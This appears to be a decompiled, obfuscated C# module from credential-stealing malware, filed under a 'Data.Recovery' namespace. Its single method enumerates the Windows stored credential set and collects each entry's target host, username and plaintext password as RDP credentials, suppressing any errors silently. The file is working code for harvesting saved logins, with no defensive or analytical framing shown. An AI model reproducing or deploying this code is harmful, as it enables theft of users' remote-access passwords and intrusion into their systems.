using System;
using System.Collections.Generic;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.CredentialManagement;
using NoiseMe.Drags.App.Models.Credentials;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x02000194 RID: 404
	public class j6cd : GH9kf<RdpCredential>
	{
		// Token: 0x06000CD4 RID: 3284 RVA: 0x00028E1C File Offset: 0x0002701C
		public List<RdpCredential> EnumerateData()
		{
			List<RdpCredential> list = new List<RdpCredential>();
			try
			{
				CredentialSet credentialSet = new CredentialSet().Load();
				int num = 0;
				for (;;)
				{
					int num2 = num;
					int? num3 = (credentialSet != null) ? new int?(credentialSet.Count) : null;
					if (!(num2 < num3.GetValueOrDefault() & num3 != null))
					{
						break;
					}
					List<RdpCredential> list2 = list;
					RdpCredential rdpCredential = new RdpCredential();
					Credential credential = credentialSet[num];
					rdpCredential.Target = ((credential != null) ? credential.Target : null);
					Credential credential2 = credentialSet[num];
					rdpCredential.Password = (string.IsNullOrEmpty((credential2 != null) ? credential2.Password : null) ? "NOT SAVED" : credentialSet[num].Password);
					Credential credential3 = credentialSet[num];
					rdpCredential.Username = (string.IsNullOrEmpty((credential3 != null) ? credential3.Username : null) ? "NOT SAVED" : credentialSet[num].Username);
					list2.Add(rdpCredential);
					num++;
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
